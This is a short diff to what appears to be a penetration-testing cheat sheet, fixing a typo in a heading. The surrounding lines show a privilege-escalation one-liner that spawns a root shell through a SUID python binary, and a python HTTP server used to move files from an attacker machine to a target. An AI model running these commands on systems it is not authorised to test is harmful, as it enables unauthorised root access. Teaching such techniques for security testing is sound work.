@@ -49,7 +49,7 @@ If for example we find that python has SUID permissions, we can move to the pyth
 
 ```./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'```
 
-#### Setup a python http server so download files from attacker machine to target machine.
+#### Setup a python http server to download files from attacker machine to target machine.
 
 ```python -m http.server```
 
